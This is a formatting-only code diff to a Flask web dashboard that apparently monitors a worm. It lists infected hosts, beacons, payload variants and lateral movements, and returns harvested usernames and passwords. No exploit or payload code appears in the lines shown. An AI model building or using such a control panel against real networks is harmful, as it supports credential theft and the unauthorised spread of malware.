@@ -76,7 +76,9 @@ class WebDashboard:
 
         self.app = Flask(__name__)
         self._setup_routes()
-        logger.info(f"Web Dashboard initialized on {self.host}:{self.port} (commands: {'on' if COMMANDS_ENABLED else 'off'})")
+        logger.info(
+            f"Web Dashboard initialized on {self.host}:{self.port} (commands: {'on' if COMMANDS_ENABLED else 'off'})"
+        )
 
     # ── routes ───────────────────────────────────────────────────────
 
@@ -227,8 +229,12 @@ class WebDashboard:
                     "cpu": host_state.cpu_usage,
                     "memory": host_state.memory_usage,
                     "payload_variant": _safe_str(host_state.payload_variant),
-                    "infected_at": host_state.infected_at.isoformat() if host_state.infected_at else None,
-                    "last_beacon": host_state.last_beacon.isoformat() if host_state.last_beacon else None,
+                    "infected_at": (
+                        host_state.infected_at.isoformat() if host_state.infected_at else None
+                    ),
+                    "last_beacon": (
+                        host_state.last_beacon.isoformat() if host_state.last_beacon else None
+                    ),
                     "activities": len(host_state.activity_log),
                     "credentials_found": len(host_state.credentials_found),
                     "lateral_movements": len(host_state.lateral_movement_history),
@@ -263,7 +269,10 @@ class WebDashboard:
         if not self.worm or not self.worm.cred_manager:
             return []
         creds = self.worm.cred_manager.get_discovered_credentials()
-        return [{"username": _safe_str(u), "password": _safe_str(p), "source": "discovered"} for u, p in creds]
+        return [
+            {"username": _safe_str(u), "password": _safe_str(p), "source": "discovered"}
+            for u, p in creds
+        ]
 
     def _get_topology_data(self) -> Dict:
         nodes, edges = [], []
